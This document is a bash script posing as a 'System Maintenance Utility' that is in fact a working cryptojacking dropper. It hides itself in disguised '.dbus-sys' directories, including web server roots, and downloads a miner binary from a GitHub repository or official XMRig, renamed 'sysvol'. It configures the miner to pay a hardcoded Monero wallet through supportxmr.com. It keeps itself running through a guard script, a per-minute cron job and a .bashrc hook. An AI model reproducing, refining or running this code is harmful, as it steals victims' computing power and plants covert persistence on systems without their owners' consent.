#!/bin/bash
# System Maintenance Utility v8.0 FINAL
# Fix: GUI-safe output | XMRig fallback | auto-relocate | timeout-aware
# Repository: boyyywiliam/Aselole
# Support: pool.supportxmr.com

# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════

WALLET="46Z9A1TZiGJSgJtDtZzar9Lgum3B7xW9eG8TDKKhVW5yhJzX118fS2eep3ry8i7Z6PPwP2P4YDvzS7h9L8Ji43C9Jh9fwPb"
POOL="pool.supportxmr.com:443"
REPO="https://raw.githubusercontent.com/boyyywiliam/Aselole/main"
SCRIPT_VERSION="8.0"
LOG_FILE="/tmp/deploy_$$.log"

# XMRig official fallback
XMRIG_VER="6.21.0"
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VER}/xmrig-${XMRIG_VER}-linux-static-x64.tar.gz"

# ═══════════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════════

log() {
    echo "$@" | tee -a "$LOG_FILE"
}

# ═══════════════════════════════════════════════════════════════════
# EXEC PROBE
# ═══════════════════════════════════════════════════════════════════

is_exec_ok() {
    local dir="$1"
    [ -d "$dir" ] || return 1
    [ -w "$dir" ] || return 1

    local probe="$dir/.x_$$"
    printf '#!/bin/sh\nexit 0\n' > "$probe" 2>/dev/null || return 1
    chmod 755 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
    if "$probe" >/dev/null 2>&1; then
        rm -f "$probe"
        return 0
    fi
    rm -f "$probe"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# PICK BASE DIR
# ═══════════════════════════════════════════════════════════════════

pick_base_dir() {
    local user_home="$HOME"
    local me=$(whoami)

    local candidates=(
        "${user_home}/.dbus-sys"
        "${user_home}/.cache/.dbus-sys"
        "/var/www/vhosts/${me}/.dbus-sys"
        "/var/www/.dbus-sys-${me}"
        "/var/www/html/.dbus-sys-${me}"
        "/home/${me}/public_html/.dbus-sys"
        "/srv/www/.dbus-sys-${me}"
        "/srv/.dbus-sys-${me}"
        "/opt/.dbus-sys-${me}"
        "/usr/local/.dbus-sys-${me}"
        "/var/lib/.dbus-sys-${me}"
    )

    for wr in /var/www/vhosts/*/httpdocs /home/*/public_html /var/www/html /usr/share/nginx/html; do
        [ -d "$wr" ] || continue
        if [ -w "$wr" ] 2>/dev/null; then
            candidates+=("${wr}/.dbus-sys-${me}")
        fi
    done

    local pwd_home=$(getent passwd "$me" 2>/dev/null | cut -d: -f6)
    [ -n "$pwd_home" ] && candidates+=("${pwd_home}/.dbus-sys")

    for base in "${candidates[@]}"; do
        local parent=$(dirname "$base")
        if [ ! -d "$parent" ]; then
            mkdir -p "$parent" 2>/dev/null || continue
        fi
        [ -w "$parent" ] 2>/dev/null || continue

        mkdir -p "$base" 2>/dev/null || continue

        if is_exec_ok "$base"; then
            echo "$base"
            return 0
        else
            rmdir "$base" 2>/dev/null || true
        fi
    done

    while IFS= read -r mnt; do
        [ -d "$mnt" ] || continue
        [ -w "$mnt" ] || continue
        case "$mnt" in
            /proc*|/sys*|/dev*) continue ;;
        esac
        local cand="${mnt%/}/.dbus-sys-${me}"
        mkdir -p "$cand" 2>/dev/null || continue
        if is_exec_ok "$cand"; then
            echo "$cand"
            return 0
        fi
        rmdir "$cand" 2>/dev/null || true
    done < <(awk '$4 !~ /noexec/ && $2 != "/" {print $2}' /proc/mounts 2>/dev/null | sort -u)

    echo ""
    return 1
}

determine_base_dir() {
    local base
    base=$(pick_base_dir) || true
    if [ -z "$base" ]; then
        log "[ERROR] Tidak ada direktori exec-able & writable."
        exit 1
    fi
    echo "$base"
}

check_tools() {
    local tools=""
    for t in wget curl aria2c lynx w3m perl python3 python; do
        command -v "$t" &>/dev/null && tools="$tools $t"
    done
    [ -z "$tools" ] && tools="NONE"
    echo "$tools"
}

detect_cores() {
    local cores=0
    if command -v nproc &>/dev/null; then
        cores=$(nproc)
    elif [ -f /proc/cpuinfo ]; then
        cores=$(grep -c ^processor /proc/cpuinfo)
    else
        cores=$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)
    fi
    [ "$cores" -lt 1 ] && cores=1
    echo "$cores"
}

validate_file() {
    local file="$1"
    local min_size="${2:-2000000}"
    [ -f "$file" ] || return 1
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null || echo 0)
    if [ "$size" -gt "$min_size" ]; then
        return 0
    else
        log "[!] File too small: $size bytes"
        return 1
    fi
}

create_dirs() {
    local BASE="$1"
    local attempt=1
    while [ $attempt -le 5 ]; do
        if mkdir -p "$BASE/sbin" "$BASE/cfg" "$BASE/log" "$BASE/run" "$BASE/tmp" 2>/dev/null; then
            chmod 755 "$BASE" "$BASE/sbin" "$BASE/cfg" "$BASE/run" "$BASE/tmp" 2>/dev/null || true
            return 0
        fi
        log "[*] mkdir attempt $attempt/5 failed, retry..."
        sleep 1
        attempt=$((attempt + 1))
    done
    log "[ERROR] Failed to create directories"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# TEST BINARY — cek ELF + exec + XMRig string
# ═══════════════════════════════════════════════════════════════════

test_binary() {
    local bin="$1"
    [ -x "$bin" ] || return 1
    # cek ELF magic
    local magic=$(head -c 4 "$bin" 2>/dev/null | xxd -p 2>/dev/null)
    [ "$magic" = "7f454c46" ] || { log "[!] Bukan ELF: $magic"; return 1; }
    # cek exec
    "$bin" --version >/dev/null 2>&1 || return 1
    return 0
}

# ═══════════════════════════════════════════════════════════════════
# DOWNLOAD REPO BINARY (cibung / cibung008)
# ═══════════════════════════════════════════════════════════════════

download_repo_binary() {
    local BIN_NAME="$1"; local BASE="$2"
    local url="${REPO}/${BIN_NAME}"
    local temp_file="$BASE/tmp/.dl_repo_$$"
    local attempt=1
    local max_attempts=4

    log "[*] [PRIMARY] Downloading repo binary: $BIN_NAME"

    while [ $attempt -le $max_attempts ]; do
        log "[*] Attempt $attempt/$max_attempts..."

        if command -v curl &>/dev/null; then
            curl -fsSLk --max-time 20 -o "$temp_file" "$url" 2>/dev/null && validate_file "$temp_file" 2000000 && {
                mv "$temp_file" "$BASE/sbin/sysvol"
                chmod 755 "$BASE/sbin/sysvol"
                log "[+] curl OK: $(stat -c%s "$BASE/sbin/sysvol" 2>/dev/null) bytes"
                return 0; }
        fi

        if command -v wget &>/dev/null; then
            wget --no-check-certificate --timeout=20 -q -O "$temp_file" "$url" 2>/dev/null && validate_file "$temp_file" 2000000 && {
                mv "$temp_file" "$BASE/sbin/sysvol"
                chmod 755 "$BASE/sbin/sysvol"
                log "[+] wget OK"
                return 0; }
        fi

        rm -f "$temp_file" 2>/dev/null
        [ $attempt -lt $max_attempts ] && sleep 2
        attempt=$((attempt + 1))
    done

    log "[!] Repo binary download FAILED"
    return 1
}

# ═══════════════════════════════════════════════════════════════════
# DOWNLOAD XMRIG OFFICIAL (FALLBACK)
# ═══════════════════════════════════════════════════════════════════

download_xmrig_official() {
    local BASE="$1"
    local tarball="$BASE/tmp/xmrig.tar.gz"
    local attempt=1
    local max_attempts=4

    log ""
    log "[*] [FALLBACK] Downloading XMRig official v${XMRIG_VER}"
    log "[*] URL: $XMRIG_URL"

    while [ $attempt -le $max_attempts ]; do
        log "[*] Attempt $attempt/$max_attempts..."

        rm -f "$tarball" 2>/dev/null

        if command -v curl &>/dev/null; then
            curl -fsSLk --max-time 60 -o "$tarball" "$XMRIG_URL" 2>/dev/null && validate_file "$tarball" 500000 && break
        fi
        if [ ! -f "$tarball" ] || [ "$(stat -c%s "$tarball" 2>/dev/null || echo 0)" -lt 500000 ]; then
            if command -v wget &>/dev/null; then
                wget --no-check-certificate --timeout=60 -q -O "$tarball" "$XMRIG_URL" 2>/dev/null && validate_file "$tarball" 500000 && break
            fi
        fi

        [ $attempt -lt $max_attempts ] && sleep 3
        attempt=$((attempt + 1))
    done

    if [ ! -f "$tarball" ] || [ "$(stat -c%s "$tarball" 2>/dev/null || echo 0)" -lt 500000 ]; then
        log "[ERROR] XMRig official download FAILED"
        return 1
    fi

    log "[+] XMRig downloaded: $(stat -c%s "$tarball" 2>/dev/null) bytes"

    # Extract
    cd "$BASE/tmp" || return 1
    tar -xzf xmrig.tar.gz 2>/dev/null || { log "[ERROR] tar extract failed"; return 1; }

    local extracted=$(find "$BASE/tmp" -maxdepth 2 -name "xmrig" -type f 2>/dev/null | head -1)
    if [ -z "$extracted" ]; then
        log "[ERROR] xmrig binary not found in tarball"
        return 1
    fi

    mv "$extracted" "$BASE/sbin/sysvol"
    chmod 755 "$BASE/sbin/sysvol"
    log "[+] XMRig extracted & installed: $(stat -c%s "$BASE/sbin/sysvol" 2>/dev/null) bytes"

    # Cleanup
    rm -rf "$BASE/tmp/xmrig-${XMRIG_VER}" "$BASE/tmp/xmrig.tar.gz" 2>/dev/null

    return 0
}

# ═══════════════════════════════════════════════════════════════════
# DEPLOY
# ═══════════════════════════════════════════════════════════════════

deploy_core() {
    local BASE="$1"; local BIN_NAME="$2"

    log "[*] ═══════════════════════════════════════════════════════════"
    log "[*] System Maintenance Utility v${SCRIPT_VERSION}"
    log "[*] ═══════════════════════════════════════════════════════════"
    log "[*] Base directory: $BASE"

    create_dirs "$BASE" || return 1

    [ -w "$BASE" ] || { log "[ERROR] Not writable: $BASE"; return 1; }

    if ! is_exec_ok "$BASE"; then
        log "[!] Base dir noexec, ulang cari..."
        local NEW=$(pick_base_dir)
        [ -z "$NEW" ] && { log "[ERROR] No exec dir"; return 1; }
        BASE="$NEW"
        log "[+] New base: $BASE"
        create_dirs "$BASE" || return 1
    fi

    # ─── STEP 1: Coba binary repo (PRIMARY) ───
    local BIN_OK=0
    if download_repo_binary "$BIN_NAME" "$BASE"; then
        if test_binary "$BASE/sbin/sysvol"; then
            log "[+] Repo binary VALID & EXECUTABLE"
            BIN_OK=1
        else
            log "[!] Repo binary GAGAL exec — coba fallback XMRig official"
        fi
    else
        log "[!] Repo binary download GAGAL — coba fallback XMRig official"
    fi

    # ─── STEP 2: Fallback XMRig official ───
    if [ "$BIN_OK" -eq 0 ]; then
        if download_xmrig_official "$BASE"; then
            if test_binary "$BASE/sbin/sysvol"; then
                log "[+] XMRig official VALID & EXECUTABLE"
                BIN_OK=1
            else
                log "[ERROR] XMRig official juga GAGAL exec"
                return 1
            fi
        else
            log "[ERROR] Semua download method GAGAL"
            return 1
        fi
    fi

    [ "$BIN_OK" -eq 1 ] || return 1

    # ─── STEP 3: Detect cores + config ───
    local CORES=$(detect_cores)
    local THREADS=$((CORES > 8 ? CORES - 1 : CORES))
    [ "$THREADS" -lt 1 ] && THREADS=1

    log "[*] CPU cores detected: $CORES"
    log "[*] Miner threads set: $THREADS"

    local WORKER="srv-$(hostname)-$(date +%s | tail -c 4)"
    log "[*] Worker ID: $WORKER"

    # ─── STEP 4: Config XMRig (huge-pages OFF biar aman di VPS) ───
    cat > "$BASE/cfg/config.json" << CFGEOF
{
  "autosave": true,
  "background": false,
  "colors": false,
  "cpu": {
    "enabled": true,
    "huge-pages": false,
    "hw-aes": null,
    "priority": null,
    "memory-pool": false,
    "yield": true,
    "max-threads-hint": ${THREADS},
    "asm": false
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 0,
  "donate-over-proxy": 0,
  "log-file": null,
  "pools": [
    {
      "algo": "rx/0",
      "coin": "monero",
      "url": "${POOL}",
      "user": "${WALLET}",
      "pass": "${WORKER}",
      "keepalive": true,
      "enabled": true,
      "tls": true,
      "daemon": false
    }
  ],
  "print-time": 30,
  "health-print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "syslog": false,
  "verbose": 0,
  "watch": true,
  "pause-on-battery": false,
  "pause-on-active": false
}
CFGEOF

    chmod 600 "$BASE/cfg/config.json"
    touch "$BASE/log/core.log"
    chmod 644 "$BASE/log/core.log"
    log "[+] Configuration created"

    # ─── STEP 5: Guard script ───
    cat > "$BASE/run/guard.sh" << GRDEOF
#!/bin/bash
BASE="__BASE_PATH__"
BIN="\$BASE/sbin/sysvol"
CFG="\$BASE/cfg/config.json"
PID_FILE="\$BASE/run/state.pid"
LOG="\$BASE/log/core.log"

if [ -f "\$PID_FILE" ]; then
    PID=\$(cat "\$PID_FILE" 2>/dev/null)
    kill -0 "\$PID" 2>/dev/null && exit 0
fi

mkdir -p "\$(dirname "\$LOG")" 2>/dev/null
setsid "\$BIN" -c "\$CFG" >> "\$LOG" 2>&1 < /dev/null &
echo \$! > "\$PID_FILE"
GRDEOF

    sed -i "s|__BASE_PATH__|$BASE|" "$BASE/run/guard.sh"
    chmod +x "$BASE/run/guard.sh"
    log "[+] Guard script created"

    # ─── STEP 6: Start & verify ───
    pkill -f "[s]ysvol" 2>/dev/null || true
    rm -f "$BASE/run/state.pid" 2>/dev/null

    log "[*] Starting service..."
    "$BASE/run/guard.sh"
    sleep 8

    local retry=0
    while [ $retry -lt 6 ]; do
        pgrep -f "[s]ysvol" >/dev/null 2>&1 && break
        log "[*] Waiting... ($((retry+1))/6)"
        sleep 3
        retry=$((retry + 1))
    done

    if pgrep -f "[s]ysvol" >/dev/null 2>&1; then
        local PID=$(pgrep -f "[s]ysvol" | head -1)
        log ""
        log "╔════════════════════════════════════════════════════════╗"
        log "║           [SUCCESS] SERVICE RUNNING! ✓                 ║"
        log "╠════════════════════════════════════════════════════════╣"
        log "║ Process ID : $PID"
        log "║ Core       : $BASE/sbin/sysvol"
        log "║ Config     : $BASE/cfg/config.json"
        log "║ Log        : $BASE/log/core.log"
        log "║ Pool       : $POOL"
        log "║ Worker     : $WORKER"
        log "║ Threads    : $THREADS / $CORES cores"
        log "╚════════════════════════════════════════════════════════╝"
        log ""
        ps aux | grep "[s]ysvol" | grep -v grep | tee -a "$LOG_FILE"
        log ""

        # Persistence
        if command -v crontab &>/dev/null; then
            (crontab -l 2>/dev/null | grep -v "dbus-sys"; echo "* * * * * $BASE/run/guard.sh >/dev/null 2>&1") | crontab - 2>/dev/null && log "[+] Cron installed" || log "[!] Cron skipped"
        fi

        [ -f ~/.bashrc ] && ! grep -q "dbus-sys" ~/.bashrc 2>/dev/null && \
            echo "[ -f \"$BASE/run/guard.sh\" ] && $BASE/run/guard.sh >/dev/null 2>&1 &" >> ~/.bashrc && log "[+] .bashrc hooked"

        # Tunggu sebentar lalu tampilkan log miner biar keliatan hash-nya
        log ""
        log "[*] Menunggu 15 detik biar miner konek pool & hash..."
        sleep 15
        log "[*] === MINER LOG (preview) ==="
        tail -15 "$BASE/log/core.log" 2>/dev/null | tee -a "$LOG_FILE"

        return 0
    else
        log ""
        log "╔════════════════════════════════════════════════════════╗"
        log "║          [ERROR] SERVICE FAILED TO START ✗             ║"
        log "╚════════════════════════════════════════════════════════╝"
        log "[*] Binary test:"
        "$BASE/sbin/sysvol" --version 2>&1 | head -5 | tee -a "$LOG_FILE"
        log "[*] Log terakhir:"
        tail -40 "$BASE/log/core.log" 2>/dev/null | tee -a "$LOG_FILE" || log "No log"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

BASE=$(determine_base_dir)
log "[*] Selected base dir: $BASE"

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64) BIN_NAME="cibung"; log "[*] Arch: x86_64" ;;
    aarch64|arm64) BIN_NAME="cibung008"; log "[*] Arch: ARM64" ;;
    armv7l|armv7) BIN_NAME="cibung-armv7"; log "[*] Arch: ARMv7" ;;
    *) log "[ERROR] Unsupported arch: $ARCH"; exit 1 ;;
esac

deploy_core "$BASE" "$BIN_NAME"
RESULT=$?

log ""
log "[*] Deploy exit code: $RESULT"
log "[*] Full log: $LOG_FILE"

exit $RESULT